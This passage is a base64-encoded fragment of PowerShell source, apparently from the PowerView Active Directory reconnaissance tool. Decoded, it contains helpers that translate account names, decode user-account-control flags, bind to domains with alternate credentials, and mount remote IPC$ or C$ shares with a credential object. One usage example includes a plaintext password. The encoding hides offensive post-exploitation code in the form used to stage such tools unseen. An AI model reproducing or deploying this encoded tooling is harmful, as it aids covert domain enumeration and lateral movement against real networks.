iAgICAgICAgICAgICRUcmFuc2xhdGUgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgTmFtZVRyYW5zbGF0ZQoKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRDcmVkID0gJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKQoKICAgICAgICAgICAgICAgICAgICBJbnZva2UtTWV0aG9kICRUcmFuc2xhdGUgJ0luaXRFeCcgKAogICAgICAgICAgICAgICAgICAgICAgICAkQURTSW5pdFR5cGUsCiAgICAgICAgICAgICAgICAgICAgICAgICRJbml0TmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgJENyZWQuVXNlck5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICRDcmVkLkRvbWFpbiwKICAgICAgICAgICAgICAgICAgICAgICAgJENyZWQuUGFzc3dvcmQKICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0NvbnZlcnQtQUROYW1lXSBFcnJvciBpbml0aWFsaXppbmcgdHJhbnNsYXRpb24gZm9yICckSWRlbnRpdHknIHVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyA6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAkTnVsbCA9IEludm9rZS1NZXRob2QgJFRyYW5zbGF0ZSAnSW5pdCcgKAogICAgICAgICAgICAgICAgICAgICAgICAkQURTSW5pdFR5cGUsCiAgICAgICAgICAgICAgICAgICAgICAgICRJbml0TmFtZQogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbQ29udmVydC1BRE5hbWVdIEVycm9yIGluaXRpYWxpemluZyB0cmFuc2xhdGlvbiBmb3IgJyRJZGVudGl0eScgOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBhbHdheXMgY2hhc2UgYWxsIHJlZmVycmFscwogICAgICAgICAgICBTZXQtUHJvcGVydHkgJFRyYW5zbGF0ZSAnQ2hhc2VSZWZlcnJhbCcgKDB4NjApCgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgIyA4ID0gVW5rbm93biBuYW1lIHR5cGUgLT4gbGV0IHRoZSBzZXJ2ZXIgZG8gdGhlIHdvcmsgZm9yIHVzCiAgICAgICAgICAgICAgICAkTnVsbCA9IEludm9rZS1NZXRob2QgJFRyYW5zbGF0ZSAnU2V0JyAoOCwgJFRhcmdldElkZW50aXR5KQogICAgICAgICAgICAgICAgSW52b2tlLU1ldGhvZCAkVHJhbnNsYXRlICdHZXQnICgkQURTT3V0cHV0VHlwZSkKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5NZXRob2RJbnZvY2F0aW9uRXhjZXB0aW9uXSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbQ29udmVydC1BRE5hbWVdIEVycm9yIHRyYW5zbGF0aW5nICckVGFyZ2V0SWRlbnRpdHknIDogJCgkXy5FeGNlcHRpb24uSW5uZXJFeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBDb252ZXJ0RnJvbS1VQUNWYWx1ZSB7CjwjCi5TWU5PUFNJUwoKQ29udmVydHMgYSBVQUMgaW50IHZhbHVlIHRvIGh1bWFuIHJlYWRhYmxlIGZvcm0uCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHdpbGwgdGFrZSBhbiBpbnRlZ2VyIHRoYXQgcmVwcmVzZW50cyBhIFVzZXIgQWNjb3VudApDb250cm9sIChVQUMpIGJpbmFyeSBibG9iIGFuZCB3aWxsIGNvdmVydCBpdCB0byBhbiBvcmRlcmVkCmRpY3Rpb25hcnkgd2l0aCBlYWNoIGJpdHdpc2UgdmFsdWUgYnJva2VuIG91dC4gQnkgZGVmYXVsdCBvbmx5IHZhbHVlcwpzZXQgYXJlIGRpc3BsYXllZC0gdGhlIC1TaG93QWxsIHN3aXRjaCB3aWxsIGRpc3BsYXkgYWxsIHZhbHVlcyB3aXRoCmEgKyBuZXh0IHRvIHRoZSBvbmVzIHNldC4KCi5QQVJBTUVURVIgVmFsdWUKClNwZWNpZmllcyB0aGUgaW50ZWdlciBVQUMgdmFsdWUgdG8gY29udmVydC4KCi5QQVJBTUVURVIgU2hvd0FsbAoKU3dpdGNoLiBTaWduYWxzIENvbnZlcnRGcm9tLVVBQ1ZhbHVlIHRvIGRpc3BsYXkgYWxsIFVBQyB2YWx1ZXMsIHdpdGggYSArIGluZGljYXRpbmcgdGhlIHZhbHVlIGlzIGN1cnJlbnRseSBzZXQuCgouRVhBTVBMRQoKQ29udmVydEZyb20tVUFDVmFsdWUgLVZhbHVlIDY2MTc2CgpOYW1lICAgICAgICAgICAgICAgICAgICAgICAgICAgVmFsdWUKLS0tLSAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tLS0tCkVOQ1JZUFRFRF9URVhUX1BXRF9BTExPV0VEICAgICAxMjgKTk9STUFMX0FDQ09VTlQgICAgICAgICAgICAgICAgIDUxMgpET05UX0VYUElSRV9QQVNTV09SRCAgICAgICAgICAgNjU1MzYKCi5FWEFNUExFCgpHZXQtRG9tYWluVXNlciBoYXJtajB5IHwgQ29udmVydEZyb20tVUFDVmFsdWUKCk5hbWUgICAgICAgICAgICAgICAgICAgICAgICAgICBWYWx1ZQotLS0tICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0tLS0KTk9STUFMX0FDQ09VTlQgICAgICAgICAgICAgICAgIDUxMgpET05UX0VYUElSRV9QQVNTV09SRCAgICAgICAgICAgNjU1MzYKCi5FWEFNUExFCgpHZXQtRG9tYWluVXNlciBoYXJtajB5IHwgQ29udmVydEZyb20tVUFDVmFsdWUgLVNob3dBbGwKCk5hbWUgICAgICAgICAgICAgICAgICAgICAgICAgICBWYWx1ZQotLS0tICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0tLS0KU0NSSVBUICAgICAgICAgICAgICAgICAgICAgICAgIDEKQUNDT1VOVERJU0FCTEUgICAgICAgICAgICAgICAgIDIKSE9NRURJUl9SRVFVSVJFRCAgICAgICAgICAgICAgIDgKTE9DS09VVCAgICAgICAgICAgICAgICAgICAgICAgIDE2ClBBU1NXRF9OT1RSRVFEICAgICAgICAgICAgICAgICAzMgpQQVNTV0RfQ0FOVF9DSEFOR0UgICAgICAgICAgICAgNjQKRU5DUllQVEVEX1RFWFRfUFdEX0FMTE9XRUQgICAgIDEyOApURU1QX0RVUExJQ0FURV9BQ0NPVU5UICAgICAgICAgMjU2Ck5PUk1BTF9BQ0NPVU5UICAgICAgICAgICAgICAgICA1MTIrCklOVEVSRE9NQUlOX1RSVVNUX0FDQ09VTlQgICAgICAyMDQ4CldPUktTVEFUSU9OX1RSVVNUX0FDQ09VTlQgICAgICA0MDk2ClNFUlZFUl9UUlVTVF9BQ0NPVU5UICAgICAgICAgICA4MTkyCkRPTlRfRVhQSVJFX1BBU1NXT1JEICAgICAgICAgICA2NTUzNisKTU5TX0xPR09OX0FDQ09VTlQgICAgICAgICAgICAgIDEzMTA3MgpTTUFSVENBUkRfUkVRVUlSRUQgICAgICAgICAgICAgMjYyMTQ0ClRSVVNURURfRk9SX0RFTEVHQVRJT04gICAgICAgICA1MjQyODgKTk9UX0RFTEVHQVRFRCAgICAgICAgICAgICAgICAgIDEwNDg1NzYKVVNFX0RFU19LRVlfT05MWSAgICAgICAgICAgICAgIDIwOTcxNTIKRE9OVF9SRVFfUFJFQVVUSCAgICAgICAgICAgICAgIDQxOTQzMDQKUEFTU1dPUkRfRVhQSVJFRCAgICAgICAgICAgICAgIDgzODg2MDgKVFJVU1RFRF9UT19BVVRIX0ZPUl9ERUxFR0FUSU9OIDE2Nzc3MjE2ClBBUlRJQUxfU0VDUkVUU19BQ0NPVU5UICAgICAgICA2NzEwODg2NAoKLklOUFVUUwoKSW50CgpBY2NlcHRzIGFuIGludGVnZXIgcmVwcmVzZW50aW5nIGEgVUFDIGJpbmFyeSBibG9iLgoKLk9VVFBVVFMKClN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQoKQW4gb3JkZXJlZCBkaWN0aW9uYXJ5IHdpdGggdGhlIGNvbnZlcnRlZCBVQUMgZmllbGRzLgoKLkxJTksKCmh0dHBzOi8vc3VwcG9ydC5taWNyb3NvZnQuY29tL2VuLXVzL2tiLzMwNTE0NAojPgoKICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnknKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnVUFDJywgJ3VzZXJhY2NvdW50Y29udHJvbCcpXQogICAgICAgIFtJbnRdCiAgICAgICAgJFZhbHVlLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRTaG93QWxsCiAgICApCgogICAgQkVHSU4gewogICAgICAgICMgdmFsdWVzIGZyb20gaHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4tdXMva2IvMzA1MTQ0CiAgICAgICAgJFVBQ1ZhbHVlcyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIlNDUklQVCIsIDEpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIkFDQ09VTlRESVNBQkxFIiwgMikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiSE9NRURJUl9SRVFVSVJFRCIsIDgpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIkxPQ0tPVVQiLCAxNikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiUEFTU1dEX05PVFJFUUQiLCAzMikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiUEFTU1dEX0NBTlRfQ0hBTkdFIiwgNjQpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIkVOQ1JZUFRFRF9URVhUX1BXRF9BTExPV0VEIiwgMTI4KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJURU1QX0RVUExJQ0FURV9BQ0NPVU5UIiwgMjU2KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJOT1JNQUxfQUNDT1VOVCIsIDUxMikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiSU5URVJET01BSU5fVFJVU1RfQUNDT1VOVCIsIDIwNDgpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIldPUktTVEFUSU9OX1RSVVNUX0FDQ09VTlQiLCA0MDk2KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJTRVJWRVJfVFJVU1RfQUNDT1VOVCIsIDgxOTIpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIkRPTlRfRVhQSVJFX1BBU1NXT1JEIiwgNjU1MzYpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIk1OU19MT0dPTl9BQ0NPVU5UIiwgMTMxMDcyKQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJTTUFSVENBUkRfUkVRVUlSRUQiLCAyNjIxNDQpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIlRSVVNURURfRk9SX0RFTEVHQVRJT04iLCA1MjQyODgpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIk5PVF9ERUxFR0FURUQiLCAxMDQ4NTc2KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJVU0VfREVTX0tFWV9PTkxZIiwgMjA5NzE1MikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiRE9OVF9SRVFfUFJFQVVUSCIsIDQxOTQzMDQpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIlBBU1NXT1JEX0VYUElSRUQiLCA4Mzg4NjA4KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJUUlVTVEVEX1RPX0FVVEhfRk9SX0RFTEVHQVRJT04iLCAxNjc3NzIxNikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiUEFSVElBTF9TRUNSRVRTX0FDQ09VTlQiLCA2NzEwODg2NCkKICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICAkUmVzdWx0VUFDVmFsdWVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkKCiAgICAgICAgaWYgKCRTaG93QWxsKSB7CiAgICAgICAgICAgIEZvckVhY2ggKCRVQUNWYWx1ZSBpbiAkVUFDVmFsdWVzLkdldEVudW1lcmF0b3IoKSkgewogICAgICAgICAgICAgICAgaWYgKCAoJFZhbHVlIC1iYW5kICRVQUNWYWx1ZS5WYWx1ZSkgLWVxICRVQUNWYWx1ZS5WYWx1ZSkgewogICAgICAgICAgICAgICAgICAgICRSZXN1bHRVQUNWYWx1ZXMuQWRkKCRVQUNWYWx1ZS5OYW1lLCAiJCgkVUFDVmFsdWUuVmFsdWUpKyIpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0VUFDVmFsdWVzLkFkZCgkVUFDVmFsdWUuTmFtZSwgIiQoJFVBQ1ZhbHVlLlZhbHVlKSIpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIEZvckVhY2ggKCRVQUNWYWx1ZSBpbiAkVUFDVmFsdWVzLkdldEVudW1lcmF0b3IoKSkgewogICAgICAgICAgICAgICAgaWYgKCAoJFZhbHVlIC1iYW5kICRVQUNWYWx1ZS5WYWx1ZSkgLWVxICRVQUNWYWx1ZS5WYWx1ZSkgewogICAgICAgICAgICAgICAgICAgICRSZXN1bHRVQUNWYWx1ZXMuQWRkKCRVQUNWYWx1ZS5OYW1lLCAiJCgkVUFDVmFsdWUuVmFsdWUpIikKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkUmVzdWx0VUFDVmFsdWVzCiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtUHJpbmNpcGFsQ29udGV4dCB7CjwjCi5TWU5PUFNJUwoKSGVscGVyIHRvIHRha2UgYW4gSWRlbnRpdHkgYW5kIHJldHVybiBhIERpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlByaW5jaXBhbENvbnRleHQKYW5kIHNpbXBsaWZpZWQgaWRlbnRpdHkuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUgIAoKLlBBUkFNRVRFUiBJZGVudGl0eQoKQSBncm91cCBTYW1BY2NvdW50TmFtZSAoZS5nLiBHcm91cDEpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1ncm91cDEsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMTQpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMiksCm9yIGEgRE9NQUlOXHVzZXJuYW1lIGlkZW50aXR5LgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSB0byBzZWFyY2ggZm9yIHVzZXIvZ3JvdXAgcHJpbmNpcGFscywgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0dyb3VwTmFtZScsICdHcm91cElkZW50aXR5JyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSWRlbnRpdHksCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudAoKICAgIHRyeSB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10gLW9yICgkSWRlbnRpdHkgLW1hdGNoICcuK1xcLisnKSkgewogICAgICAgICAgICBpZiAoJElkZW50aXR5IC1tYXRjaCAnLitcXC4rJykgewogICAgICAgICAgICAgICAgIyBET01BSU5cZ3JvdXBuYW1lCiAgICAgICAgICAgICAgICAkQ29udmVydGVkSWRlbnRpdHkgPSAkSWRlbnRpdHkgfCBDb252ZXJ0LUFETmFtZSAtT3V0cHV0VHlwZSBDYW5vbmljYWwKICAgICAgICAgICAgICAgIGlmICgkQ29udmVydGVkSWRlbnRpdHkpIHsKICAgICAgICAgICAgICAgICAgICAkQ29ubmVjdFRhcmdldCA9ICRDb252ZXJ0ZWRJZGVudGl0eS5TdWJTdHJpbmcoMCwgJENvbnZlcnRlZElkZW50aXR5LkluZGV4T2YoJy8nKSkKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0SWRlbnRpdHkgPSAkSWRlbnRpdHkuU3BsaXQoJ1wnKVsxXQogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtUHJpbmNpcGFsQ29udGV4dF0gQmluZGluZyB0byBkb21haW4gJyRDb25uZWN0VGFyZ2V0JyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRPYmplY3RJZGVudGl0eSA9ICRJZGVudGl0eQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1QcmluY2lwYWxDb250ZXh0XSBCaW5kaW5nIHRvIGRvbWFpbiAnJERvbWFpbiciCiAgICAgICAgICAgICAgICAkQ29ubmVjdFRhcmdldCA9ICREb21haW4KICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbR2V0LVByaW5jaXBhbENvbnRleHRdIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscycKICAgICAgICAgICAgICAgICRDb250ZXh0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlByaW5jaXBhbENvbnRleHQgLUFyZ3VtZW50TGlzdCAoW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Db250ZXh0VHlwZV06OkRvbWFpbiwgJENvbm5lY3RUYXJnZXQsICRDcmVkZW50aWFsLlVzZXJOYW1lLCAkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJENvbnRleHQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuUHJpbmNpcGFsQ29udGV4dCAtQXJndW1lbnRMaXN0IChbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LkNvbnRleHRUeXBlXTo6RG9tYWluLCAkQ29ubmVjdFRhcmdldCkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbR2V0LVByaW5jaXBhbENvbnRleHRdIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscycKICAgICAgICAgICAgICAgICREb21haW5OYW1lID0gR2V0LURvbWFpbiB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IE5hbWUKICAgICAgICAgICAgICAgICRDb250ZXh0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlByaW5jaXBhbENvbnRleHQgLUFyZ3VtZW50TGlzdCAoW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Db250ZXh0VHlwZV06OkRvbWFpbiwgJERvbWFpbk5hbWUsICRDcmVkZW50aWFsLlVzZXJOYW1lLCAkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJENvbnRleHQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuUHJpbmNpcGFsQ29udGV4dCAtQXJndW1lbnRMaXN0IChbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LkNvbnRleHRUeXBlXTo6RG9tYWluKQogICAgICAgICAgICB9CiAgICAgICAgICAgICRPYmplY3RJZGVudGl0eSA9ICRJZGVudGl0eQogICAgICAgIH0KCiAgICAgICAgJE91dCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbnRleHQnICRDb250ZXh0CiAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJZGVudGl0eScgJE9iamVjdElkZW50aXR5CiAgICAgICAgJE91dAogICAgfQogICAgY2F0Y2ggewogICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtUHJpbmNpcGFsQ29udGV4dF0gRXJyb3IgY3JlYXRpbmcgYmluZGluZyBmb3Igb2JqZWN0ICgnJElkZW50aXR5JykgY29udGV4dCA6ICRfIgogICAgfQp9CgoKZnVuY3Rpb24gQWRkLVJlbW90ZUNvbm5lY3Rpb24gewo8IwouU1lOT1BTSVMKClBzZXVkbyAibW91bnRzIiBhIGNvbm5lY3Rpb24gdG8gYSByZW1vdGUgcGF0aCB1c2luZyB0aGUgc3BlY2lmaWVkCmNyZWRlbnRpYWwgb2JqZWN0LCBhbGxvd2luZyBmb3IgYWNjZXNzIG9mIHJlbW90ZSByZXNvdXJjZXMuIElmIGEgLVBhdGggaXNuJ3QKc3BlY2lmaWVkLCBhIC1Db21wdXRlck5hbWUgaXMgcmVxdWlyZWQgdG8gcHNldWRvLW1vdW50IElQQyQuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IFBTUmVmbGVjdCAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gdXNlcyBXTmV0QWRkQ29ubmVjdGlvbjJXIHRvIG1ha2UgYSAndGVtcG9yYXJ5JyAoaS5lLiBub3Qgc2F2ZWQpIGNvbm5lY3Rpb24KdG8gdGhlIHNwZWNpZmllZCByZW1vdGUgLVBhdGggKFxcVU5DXHNoYXJlKSB3aXRoIHRoZSBhbHRlcm5hdGUgY3JlZGVudGlhbHMgc3BlY2lmaWVkIGluIHRoZQotQ3JlZGVudGlhbCBvYmplY3QuIElmIGEgLVBhdGggaXNuJ3Qgc3BlY2lmaWVkLCBhIC1Db21wdXRlck5hbWUgaXMgcmVxdWlyZWQgdG8gcHNldWRvLW1vdW50IElQQyQuCgpUbyBkZXN0cm95IHRoZSBjb25uZWN0aW9uLCB1c2UgUmVtb3ZlLVJlbW90ZUNvbm5lY3Rpb24gd2l0aCB0aGUgc2FtZSBzcGVjaWZpZWQgXFxVTkNcc2hhcmUgcGF0aApvciAtQ29tcHV0ZXJOYW1lLgoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyB0aGUgc3lzdGVtIHRvIGFkZCBhIFxcQ29tcHV0ZXJOYW1lXElQQyQgY29ubmVjdGlvbiBmb3IuCgouUEFSQU1FVEVSIFBhdGgKClNwZWNpZmllcyB0aGUgcmVtb3RlIFxcVU5DXHBhdGggdG8gYWRkIHRoZSBjb25uZWN0aW9uIGZvci4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgcmVtb3RlIHN5c3RlbS4KCi5FWEFNUExFCgokQ3JlZCA9IEdldC1DcmVkZW50aWFsCkFkZC1SZW1vdGVDb25uZWN0aW9uIC1Db21wdXRlck5hbWUgJ1BSSU1BUlkudGVzdGxhYi5sb2NhbCcgLUNyZWRlbnRpYWwgJENyZWQKCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpBZGQtUmVtb3RlQ29ubmVjdGlvbiAtUGF0aCAnXFxQUklNQVJZLnRlc3RsYWIubG9jYWxcQyRcJyAtQ3JlZGVudGlhbCAkQ3JlZAoKLkVYQU1QTEUKCiRDcmVkID0gR2V0LUNyZWRlbnRpYWwKQCgnUFJJTUFSWS50ZXN0bGFiLmxvY2FsJywnU0VDT05EQVJZLnRlc3RsYWIubG9jYWwnKSB8IEFkZC1SZW1vdGVDb25uZWN0aW9uICAtQ3JlZGVudGlhbCAkQ3JlZAojPgoKICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ0NvbXB1dGVyTmFtZScpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0NvbXB1dGVyTmFtZScsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlv